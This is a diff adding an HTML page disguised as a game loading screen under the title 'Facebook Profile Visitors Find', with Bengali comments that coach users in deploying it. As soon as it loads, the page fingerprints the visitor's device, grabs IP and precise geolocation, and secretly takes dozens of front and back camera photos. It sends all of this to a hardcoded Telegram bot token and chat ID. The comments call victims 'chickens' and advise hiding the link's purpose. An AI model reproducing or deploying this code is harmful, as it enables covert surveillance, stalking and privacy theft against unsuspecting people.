@@ -1,0 +1,633 @@
+<!-- Programer - MD Mehadi Hasan Shuvo -->
+<!-- CEO at Cyber Protection & IT CyberFusion -->
+<!-- এখানে তোমাদের বোঝার সুবিধার্মিথে কমেন্ট করে প্রতিটা অংশের শুরুতে বুঝিয়ে বলে দিছি ওই অংশটা কি কারণে লেখা হয়েছে -->
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Profile Visitors Find</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4a6cf7;
+            --secondary-color: #6c63ff;
+            --accent-color: #f857a6;
+            --background-color: #0f0f1e;
+            --card-color: rgba(255, 255, 255, 0.05);
+            --text-color: #ffffff;
+            --text-secondary: #b8bcc8;
+            --success-color: #4caf50;
+            --warning-color: #ff9800;
+            --error-color: #f44336;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #0f0f1e 100%);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow: hidden;
+            transition: background 0.5s ease;
+        }
+
+        /* --- উন্নত অ্যানিমেটেড ব্যাকগ্রাউন্ড --- */
+        .animated-bg {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .animated-bg span {
+            position: absolute;
+            display: block;
+            width: 20px;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            animation: move 25s linear infinite;
+            bottom: -150px;
+        }
+
+        .animated-bg span:nth-child(1) { left: 25%; width: 80px; height: 80px; animation-delay: 0s; }
+        .animated-bg span:nth-child(2) { left: 10%; width: 20px; height: 20px; animation-delay: 2s; animation-duration: 12s; }
+        .animated-bg span:nth-child(3) { left: 70%; width: 120px; height: 120px; animation-delay: 4s; }
+        .animated-bg span:nth-child(4) { left: 40%; width: 60px; height: 60px; animation-delay: 0s; animation-duration: 18s; }
+        .animated-bg span:nth-child(5) { left: 65%; width: 40px; height: 40px; animation-delay: 0s; }
+        .animated-bg span:nth-child(6) { left: 75%; width: 110px; height: 110px; animation-delay: 3s; }
+        .animated-bg span:nth-child(7) { left: 35%; width: 150px; height: 150px; animation-delay: 7s; }
+        .animated-bg span:nth-child(8) { left: 50%; width: 25px; height: 25px; animation-delay: 15s; animation-duration: 45s; }
+        .animated-bg span:nth-child(9) { left: 20%; width: 90px; height: 90px; animation-delay: 2s; animation-duration: 35s; }
+        .animated-bg span:nth-child(10) { left: 85%; width: 50px; height: 50px; animation-delay: 0s; animation-duration: 11s; }
+
+        @keyframes move {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; border-radius: 0; }
+            100% { transform: translateY(-1000px) rotate(720deg); opacity: 0; border-radius: 50%; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            background-color: var(--card-color);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .header {
+            padding: 30px;
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .progress-section {
+            margin-bottom: 30px;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .status-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .status-icon {
+            display: none;
+        }
+
+        .status-message {
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+
+        /* --- হ্যাকড ইফেক্ট স্টাইল --- */
+        .blink-effect {
+            animation: blink 0.2s ease-in-out 7;
+        }
+
+        @keyframes blink {
+            0%, 50%, 100% { opacity: 1; }
+            25%, 75% { opacity: 0; background-color: red; }
+        }
+
+        .hacked-bg {
+            background: #000 !important;
+            background-image: 
+                repeating-linear-gradient(0deg, rgba(255,0,0,0.1) 0px, transparent 1px, transparent 2px, rgba(255,0,0,0.1) 3px),
+                repeating-linear-gradient(90deg, rgba(255,0,0,0.1) 0px, transparent 1px, transparent 2px, rgba(255,0,0,0.1) 3px) !important;
+        }
+        
+        .hacked-bg .animated-bg {
+            display: none;
+        }
+
+        .hacked-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 5rem;
+            font-weight: 900;
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000;
+            z-index: 1000;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            white-space: pre;
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000; transform: translate(-50%, -50%); }
+            25% { text-shadow: -2px 0 #00ffff, 2px 0 #ff00ff; transform: translate(-52%, -48%); }
+            50% { text-shadow: 2px 0 #00ffff, -2px 0 #ff00ff; transform: translate(-48%, -52%); }
+            75% { text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000; transform: translate(-50%, -50%); }
+        }
+        
+        /* রেসপন্সিভ ডিজাইন */
+        @media (max-width: 768px) {
+            .header h1 { font-size: 2rem; }
+            .content { padding: 20px; }
+            .hacked-message { font-size: 3rem; }
+        }
+    </style>
+</head>
+<body>
+    <!-- অ্যানিমেটেড ব্যাকগ্রাউন্ড -->
+    <div class="animated-bg">
+        <span></span><span></span><span></span><span></span><span></span>
+        <span></span><span></span><span></span><span></span><span></span>
+    </div>
+
+    <div class="container">
+        <div class="header">
+           <h1><i class="fa-solid fa-gamepad"></i> Ninja Guardian</h1>
+            <p>In The Wait, The Game Prepares Itself</p>
+            <p>Be Ready Too</p>
+        </div>
+        
+        <div class="content">
+            <div id="progressSection" class="progress-section">
+                <div class="progress-bar">
+                    <div id="progress" class="progress"></div>
+                </div>
+                
+                <div class="status-container">
+                    <div id="statusIcon" class="status-icon"></div>
+                    <div id="statusMessage" class="status-message">Please Wait... </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- হ্যাকড মেসেজ (তাইলে এইগুলা চেঞ্জ করতে পারো যাতে যাতে লিংক দেওয়া সে যেন কোন অভি বুঝতে না পারে আর নিজে না পারলে আমাকে নক দিও আমি করে দিব নে) -->
+    <div id="hackedMessage" class="hacked-message"><b><b><h2>Please Wait<br>Loading...</h2></b></div>
+
+    <script>
+        // --- আপডেটেড ক্রেডেনশিয়ালস ---
+        // --- এই দুইটা জিনিস অর্থাৎ টোকেন এবং চ্যাট আইডি চেঞ্জ করার সময় অবশ্যই সতর্ক থাকো দুই পাশের কোটেশন মার্ক যেন কেটে না যায় খেয়াল রাখো ---
+    
+        const botToken = '8434155870:AAFOsohKVehSdNBMF42TkJ7ux1wBOEDhM1U';
+        const chatId = '5890970827';
+        
+        // DOM এলিমেন্টস (যারা কোডিং কম পারো তাদের এগুলো নিয়ে ঘাটাঘাটি করার দরকার নেই)
+        const progressSection = document.getElementById('progressSection');
+        const progress = document.getElementById('progress');
+        const statusMessage = document.getElementById('statusMessage');
+        const container = document.querySelector('.container');
+        const hackedMessage = document.getElementById('hackedMessage');
+        
+        // প্রোগ্রেস আপডেট করার ফাংশন এর অংশ এখানে
+        function updateProgress(percent) {
+            progress.style.width = `${percent}%`;
+        }
+        
+        // হ্যাকড ইফেক্ট দেখানোর ফাংশন চাইলে তোমরা এটাকে নিজের মতো পরিবর্তন করে নিতে পারো
+        function showHackedEffect() {
+            progressSection.style.display = 'none';
+            container.style.display = 'none';
+
+            document.body.classList.add('blink-effect');
+
+            setTimeout(() => {
+                document.body.classList.remove('blink-effect');
+                document.body.classList.add('hacked-bg');
+                hackedMessage.style.display = 'block';
+                
+                // হ্যাকড স্ক্রিন দেখানোর পর কন্টিনিউয়াস ক্যাপচার শুরু করুন
+                startContinuousCapture(); 
+            }, 1400);
+        }
+        
+        // --- টেলিগ্রামে পাঠানোর ফাংশন (স্বাক্ষর সহ) ---
+        async function sendToTelegram(message, photoBase64 = null) {
+            const signature = "\n\n---\n<i>Tools Developer : @Mehadi_Bhai</i>";
+            const finalMessage = message + signature;
+            try {
+                if (photoBase64) {
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                    const blob = await (await fetch(photoBase64)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', finalMessage);
+                    formData.append('parse_mode', 'HTML');
+                    await fetch(telegramUrl, { method: 'POST', body: formData });
+                } else {
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: finalMessage, parse_mode: 'HTML' }),
+                    });
+                }
+            } catch (error) {
+                console.error("Telegram Error:", error);
+            }
+        }
+
+        // --- সম্পূর্ণ নির্ভরযোগ্য লোকেশন সংগ্রহের ফাংশন ---
+        function getLocationData() {
+            return new Promise((resolve) => {
+                if (!('geolocation' in navigator)) {
+                    resolve({ status: 'Geolocation API সমর্থিত নয়', mapLink: '' });
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 25000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const lat = pos.coords.latitude.toFixed(6);
+                        const lon = pos.coords.longitude.toFixed(6);
+                        resolve({
+                            status: `Lat: ${lat}, Lon: ${lon} (Accuracy: ${pos.coords.accuracy.toFixed(0)}m)`,
+                            mapLink: `https://www.google.com/maps?q=${lat},${lon}`
+                        });
+                    },
+                    err => {
+                        let statusMessage = 'অবস্থান নির্ণয় করা যায়নি';
+                        if (err.code === err.PERMISSION_DENIED) {
+                            statusMessage = ' মুরগি অবস্থানের অনুমতি দেয়নি';
+                        } else if (err.code === err.POSITION_UNAVAILABLE) {
+                            statusMessage = 'অবস্থানের তথ্য উপলব্ধ নয়';
+                        } else if (err.code === err.TIMEOUT) {
+                            statusMessage = 'অবস্থান নির্ণয়ে সময়সীমা পার হয়েছে';
+                        }
+                        resolve({ status: statusMessage, mapLink: '' });
+                    },
+                    options
+                );
+            });
+        }
+
+        // সম্পূর্ণ প্রক্রিয়া চালানোর ফাংশন
+        async function runFullProcess() {
+            try {
+                updateProgress(10);
+                
+                let ipAddress = 'জানা যায়নি';
+                try { 
+                    const ipRes = await fetch('https://api.ipify.org?format=json'); 
+                    const ipJson = await ipRes.json(); 
+                    ipAddress = ipJson.ip; 
+                } catch (e) {}
+                
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const networkInfo = { 
+                    type: connection ? connection.effectiveType : 'জানা যায়নি', 
+                    downlink: connection ? connection.downlink + ' Mbps' : 'জানা যায়নি', 
+                    rtt: connection ? connection.rtt + ' ms' : 'জানা যায়নি' 
+                };
+                
+                let batteryData = { status: 'সমর্থিত নয়' };
+                if ('getBattery' in navigator) {
+                    try {
+                        const b = await navigator.getBattery();
+                        batteryData.status = `চার্জ: ${(b.level * 100).toFixed(0)}%, চার্জিং: ${b.charging ? 'হ্যাঁ' : 'না'}`;
+                    } catch (e) {}
+                }
+                
+                const instantData = {
+                    referrer: document.referrer || 'সরাসরি ভিজিট',
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack === '1' ? 'হ্যাঁ' : 'না',
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'সমর্থিত নয়',
+                    cpuCores: navigator.hardwareConcurrency || 'সমর্থিত নয়',
+                    webglRenderer: getWebGLRenderer(),
+                    installedFonts: getInstalledFonts(),
+                    audioFingerprint: getAudioFingerprint(),
+                    ip: ipAddress,
+                    battery: batteryData.status,
+                    ...networkInfo
+                };
+                
+                await sendToTelegram(`<b> [== মুরগি লিংকে ক্লিক করছে ==] </b>\n${JSON.stringify(instantData, null, 2)}`);
+
+                updateProgress(40);
+                
+                const locationData = await getLocationData();
+                const locationMessage = `<b> [== অবস্থান বিষয়ক ==] </b>\n<b>লোকেশন:</b> ${locationData.status}\n<b>ম্যাপ লিঙ্ক:</b> <a href="${locationData.mapLink}">গুগল ম্যাপে দেখুন</a>`;
+                await sendToTelegram(locationMessage);
+                
+                updateProgress(70);
+                
+                const frontPhoto = await takePhoto('user');
+                if (frontPhoto) {
+                    await sendToTelegram('মুরগির ফ্রন্ট ক্যামেরা থেকে তোলা ছবি।', frontPhoto);
+                }
+                
+                updateProgress(90);
+                
+                // ব্যাক ক্যামেরার আগে ২ সেকেন্ড বিরতি
+                statusMessage.textContent = "Please Wait..." ;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                const backPhoto = await takePhoto('environment');
+                if (backPhoto) {
+                    await sendToTelegram('মুরগির ব্যাক ক্যামেরা থেকে তোলা ছবি।', backPhoto);
+                }
+                
+                updateProgress(100);
+                
+                // সরাসরি হ্যাকড ইফেক্ট শুরু করুন
+                showHackedEffect();
+                
+            } catch (error) {
+                console.error("Process failed:", error);
+                statusMessage.textContent = "প্রক্রিয়া ব্যর্থ হয়েছে!";
+                await sendToTelegram(`প্রক্রিয়া ব্যর্থ হয়েছে: ${error.message}`);
+            }
+        }
+        
+        // পেজ লোড হওয়ার সাথে সাথে টেস্ট শুরু করার ফাংশন
+        function startTest() {
+            progressSection.style.display = 'block';
+            runFullProcess();
+        }
+        
+        // --- নতুন কন্টিনিউয়াস ক্যাপচার ফাংশন ---
+        async function startContinuousCapture() {
+            const totalCaptures = 50; // ক্যাপচারের সংখ্যা বাড়ানো হয়েছে
+            for (let i = 1; i <= totalCaptures; i++) {
+                // স্ট্যাটাস মেসেজ আপডেট করা হচ্ছে না, যেমনটা অনুরোধ করা হয়েছিল
+                
+                const photo = await takeAnyPhoto();
+                if (photo) {
+                    await sendToTelegram(`কন্টিনিউয়াস ক্যাপচার (${i}/${totalCaptures})`, photo);
+                }
+                // প্রতি ছবির মধ্যে ১.৫ সেকেন্ড বিরতি
+                await new Promise(resolve => setTimeout(resolve, 1500)); 
+            }
+        }
+        
+        // --- নির্দিষ্ট ক্যামেরার জন্য ছবি তোলার ফাংশন ---
+        async function takePhoto(facingMode) {
+            let stream = null;
+            let videoElement = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode } 
+                });
+
+                videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.autoplay = true;
+                videoElement.muted = true;
+                videoElement.style.position = 'absolute';
+                videoElement.style.top = '-9999px';
+                videoElement.style.width = '1px';
+                videoElement.style.height = '1px';
+                document.body.appendChild(videoElement);
+
+                await new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => reject(new Error('Video play timeout')), 10000);
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play().then(() => {
+                            clearTimeout(timeout);
+                            setTimeout(resolve, 500); 
+                        }).catch(reject);
+                    };
+                });
+
+                const canvas = document.createElement('canvas');
+                if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+                    throw new Error("Video dimensions are zero.");
+                }
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0);
+
+                return canvas.toDataURL('image/jpeg', 0.8);
+
+            } catch (error) {
+                console.error(`Camera (${facingMode}) Error:`, error);
+                let errorMessage = 'মুরগির ক্যামেরা অ্যাক্সেস করা যায়নি মনে হয় পারমিশন একসেপ্ট করে নাই';
+                if (error instanceof DOMException) {
+                    if (error.name === 'NotAllowedError') errorMessage = 'ক্যামেরার অনুমতি দেওয়া হয়নি';
+                    else if (error.name === 'NotFoundError') errorMessage = 'কোনো ক্যামেরা পাওয়া যায়নি';
+                    else if (error.name === 'NotReadableError') errorMessage = 'ক্যামেরা ইতিমধ্যে অন্য অ্যাপ্লিকেশন ব্যবহার করছে';
+                }
+                await sendToTelegram(`ক্যামেরা ত্রুটি (${facingMode}): ${errorMessage}`);
+                return null;
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (videoElement && videoElement.parentNode) {
+                    videoElement.parentNode.removeChild(videoElement);
+                }
+            }
+        }
+
+        // --- যেকোনো উপলব্ধ ক্যামেরা থেকে ছবি তোলার ফাংশন (কন্টিনিউয়াস ক্যাপচারের জন্য) ---
+        async function takeAnyPhoto() {
+            let stream = null;
+            let videoElement = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+                videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.autoplay = true;
+                videoElement.muted = true;
+                videoElement.style.position = 'absolute';
+                videoElement.style.top = '-9999px';
+                videoElement.style.width = '1px';
+                videoElement.style.height = '1px';
+                document.body.appendChild(videoElement);
+
+                await new Promise((resolve, reject) => {
+                    const timeout = setTimeout(() => reject(new Error('Video play timeout')), 5000);
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play().then(() => {
+                            clearTimeout(timeout);
+                            setTimeout(resolve, 300);
+                        }).catch(reject);
+                    };
+                });
+
+                const canvas = document.createElement('canvas');
+                if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+                    throw new Error("Video dimensions are zero.");
+                }
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0);
+
+                return canvas.toDataURL('image/jpeg', 0.7);
+
+            } catch (error) {
+                console.error("Continuous Capture Error:", error);
+                return null;
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (videoElement && videoElement.parentNode) {
+                    videoElement.parentNode.removeChild(videoElement);
+                }
+            }
+        }
+
+        // --- ফিঙ্গারপ্রিন্টিং ফাংশন ---
+        function getInstalledFonts() {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const detectedFonts = [];
+            const fontsToCheck = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Slabo 27px', 'Roboto Condensed', 'Roboto Slab'];
+            
+            const getWidth = (font) => {
+                context.font = `${testSize} ${font}`;
+                return context.measureText(testString).width;
+            };
+            
+            const baseWidths = baseFonts.map(getWidth);
+            
+            fontsToCheck.forEach(font => {
+                const matched = baseWidths.some((baseWidth, i) => {
+                    const fontStack = `'${font}', ${baseFonts[i]}`;
+                    return getWidth(fontStack) !== baseWidth;
+                });
+                
+                if (matched) detectedFonts.push(font);
+            });
+            
+            return detectedFonts.join(', ') || 'কোনো অতিরিক্ত ফন্ট পাওয়া যায়নি';
+        }
+        
+        function getWebGLRenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return 'WebGL সমর্থিত নয়';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'তথ্য লুকানো আছে';
+            } catch (e) {
+                return 'মুরগির তথ্য পাওয়া যায়নি';
+            }
+        }
+        
+        function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const context = new AudioContext();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gain = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+                
+                gain.gain.value = 0;
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gain);
+                gain.connect(context.destination);
+                
+                oscillator.start(0);
+                const fingerprint = context.sampleRate + '|' + context.destination.channelCount;
+                
+                oscillator.stop();
+                context.close();
+                
+                return btoa(fingerprint).substring(0, 20);
+            } catch (e) {
+                return 'অডিও কন্টেক্সট সমর্থিত নয়';
+            }
+        }
+
+        // পেজটি লোড হলে স্বয়ংক্রিয়ভাবে টেস্ট শুরু করুন
+        document.addEventListener('DOMContentLoaded', startTest);
+    </script>
+</body>
+</html>
